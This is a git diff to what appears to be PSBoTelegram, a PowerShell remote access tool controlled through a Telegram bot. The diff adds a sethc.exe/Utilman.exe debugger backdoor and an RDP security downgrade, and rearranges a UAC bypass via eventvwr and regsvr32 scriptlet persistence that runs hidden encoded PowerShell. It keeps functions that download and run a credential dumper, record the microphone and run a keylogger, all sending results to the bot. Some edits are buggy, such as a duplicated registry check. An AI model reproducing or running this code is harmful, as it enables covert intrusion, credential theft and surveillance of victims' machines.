@@ -151,6 +151,19 @@ bot-send -photo $ruta -botkey $botkey -chat_id $chat_id
 
 }
 
+function Add-Registro
+{
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $False)]
+        [String]$code 
+    )
+    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\" -Name SecurityLayer -Value 1
+    New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Value $code -Force
+    New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe"
+    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" -Name Debugger -Value $code -Force
+}
+
 
 function graba-audio { param ($botkey,$chat_id,$segundos)
 IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1").content #### Grabar Audio
@@ -160,35 +173,9 @@ if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
 if ( (Test-Path $audio) -eq $true) {Remove-Item $audio}
 Get-MicrophoneAudio -Path $audio -Length $segundos -Alias "Secret" 
 bot-send -file $audio -botkey $botkey -chat_id $chat_id
-
 }
 
-function BypassUAC-CyberVaca {param ([string]$comando)
-$ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta = $env:USERPROFILE + "\appdata\local\temp\1\temp.ps1" ; $comando  | Out-File -Encoding ascii $ruta 
-New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command | Out-Null 
-$key = "registry::HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command" ; $modifica = "c:\Windows\system32\WindowsPowerShell\v1.0\powershell -executionpolicy bypass -file $ruta" ; set-item $Key $modifica
-Start-Process eventvwr.exe ; sleep -Seconds 3
-Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\ ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile ; sleep -Seconds 10; Remove-Item $ruta }
-
-
-function whoami_me {
-If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
-{[string]$privilegios = "Sin privilegios" }  else {[string]$privilegios = "Privilegios Altos"}; $usuario = $env:USERNAME ; $dominio = $env:USERDOMAIN
-$Usuario = "Usuario: $usuario`n" ; $Dominio =  "Dominio : $dominio`n" ; $Privilegios = "Privlegios : $privilegios`n"; return $usuario, $dominio, $privilegios
- }
-
-function mimigatoz {
-$ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta_temp = $env:USERPROFILE + "\appdata\local\temp\1" ; $ruta = $ruta + "\mimigatoz.txt" ; $ruta_ps1 = $ruta -replace ".txt", ".ps1"
-(curl https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1).content | Out-File $ruta_ps1 ; Set-Location $ruta_temp; ./mimigatoz.ps1  | Out-File $ruta ; cat $ruta
-bot-send -file $ruta -botkey $botkey -chat_id $chat_id
-Remove-Item $ruta_ps1 ; sleep -Seconds 5 ; Remove-Item $ruta
-}
-
-
-function persistence {
-If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
-{$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
-$agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
+function crea_plantilla_sct {param ($code)
 $plantilla_sct = '<?XML version="1.0"?>
 <scriptlet>
 <registration
@@ -206,22 +193,52 @@ classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 <public>
     <method name="Exec"></method>
 </public>
-</scriptlet>' ;
-$plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct" 
-$key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
+</scriptlet>'
+return $plantilla_sct}
+
+function BypassUAC-CyberVaca {param ([string]$comando)
+$ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta = $env:USERPROFILE + "\appdata\local\temp\1\temp.ps1" ; $comando  | Out-File -Encoding ascii $ruta 
+New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command | Out-Null 
+$key = "registry::HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command" ; $modifica = "c:\Windows\system32\WindowsPowerShell\v1.0\powershell -executionpolicy bypass -file $ruta" ; set-item $Key $modifica
+Start-Process eventvwr.exe ; sleep -Seconds 3
+Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\ ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile ; sleep -Seconds 10; Remove-Item $ruta }
+
+
+function whoami_me {
+If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{[string]$privilegios = "Sin privilegios" }  else {[string]$privilegios = "Privilegios Altos"}; $usuario = $env:USERNAME ; $dominio = $env:USERDOMAIN
+$Usuario = "Usuario: $usuario`n" ; $Dominio =  "Dominio : $dominio`n" ; $Privilegios = "Privilegios : $privilegios`n"; return $usuario, $dominio, $privilegios
+ }
+
+function mimigatoz {
+$ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta_temp = $env:USERPROFILE + "\appdata\local\temp\1" ; $ruta = $ruta + "\mimigatoz.txt" ; $ruta_ps1 = $ruta -replace ".txt", ".ps1"
+(wget https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1).content | out-file $ruta_ps1 ; Set-Location $ruta_temp; ./mimigatoz.ps1  | Out-File $ruta ; cat $ruta
+bot-send -file $ruta -botkey $botkey -chat_id $chat_id
+Remove-Item $ruta_ps1 ; sleep -Seconds 5 ; Remove-Item $ruta
+}
+
+
+
+function persistence {
+If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
+$agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
+$plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\Users\Public\Libraries\log2.sct" 
+Add-Registro -code "c:\windows\system32\regsvr32.exe /s /n /u /i:C:\Users\Public\Libraries\log2.sct scrobj.dll" | out-null ; $texto = ""
 $texto = "Persistencia ejecutada correctamente"} return $texto;break}
+
 
 
 function remove-persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios";return $texto; break }  
 else {
-$comando = (Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"})
-$key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";$check = Get-ItemProperty $key  | Select-String "regsvr32.exe" ; 
-if ($check.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
+$key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe";$check = Get-ItemProperty $key -name Debugger | Select-String "regsvr32.exe"
+$key2 = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe";$check2 = Get-ItemProperty $key2 -name Debugger | Select-String "regsvr32.exe"
+if ($check.count -eq 0 -and $check2.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
 $texto = "Eliminando persistencia"
-$modifica = "" ; set-item $Key $modifica ; Remove-Item $key
-Remove-Item C:\Windows\System32\update.sct; return $texto; break
+remove-item $key ; remove-item $key2
+Remove-Item C:\Windows\System32\log2.sct; return $texto; break
 }}}
 
 function crea_keylogger { param ($extrae)
@@ -254,26 +271,6 @@ if ($Activar -eq "Si") { New-ItemProperty -Path $ruta_key -Name $key -Value "1" 
 if ($Activar -eq "No") {Remove-ItemProperty $ruta_key -Name $key  -Force | Out-Null ; "`n`nEliminada clave de registro, es necesario reiniciar."}
 }
 
-function crea_plantilla_sct {param ($code)
-$plantilla_sct = '<?XML version="1.0"?>
-<scriptlet>
-<registration
-description="Win32COMDebug"
-progid="Win32COMDebug"
-version="1.00"
-classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
- >
- <script language="JScript">
-      <![CDATA[
-           var r = new ActiveXObject("WScript.Shell").Run("' + $CODE + '",0);
-      ]]>
- </script>
-</registration>
-<public>
-    <method name="Exec"></method>
-</public>
-</scriptlet>'
-return $plantilla_sct}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
  $help = "PSBoTelegram V0.8`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz`n[*] /KeyLogger_Selective"
@@ -296,7 +293,7 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Persistence Off") {$texto = remove-persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -eq "/KeyLogger_Selective") {$texto = "Activa un KeyLogger de manera selectiva.`n Ejemplo: /KeyLogger_Selective facebook"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/KeyLogger_Selective *") {$comando = $comando -replace "/KeyLogger_Selective ",""; $code = crea_keylogger -extrae $comando ; $code = code_a_base64 -code $code; $code = "powershell.exe -win hidden -enc " + $code ; $plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\windows\system32\log.sct"  ; IEX  'c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 10 ; Remove-Item C:\Windows\System32\log.sct}
- if ($comando -like "/MimiGatoz") {mimigatoz}
+ if ($comando -like "/MimiGatoz  -and $first_connect -gt 5") {mimigatoz}
 # if ($comando -eq "Mimikittenz") {$texto = "La funcion mimikitenz se ejecuta: `n /Mimikittenz On`n /Mimikittenz Off"}
  if ($comando -eq "Mimikittenz") {$texto = "Proximamente.."; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
 }
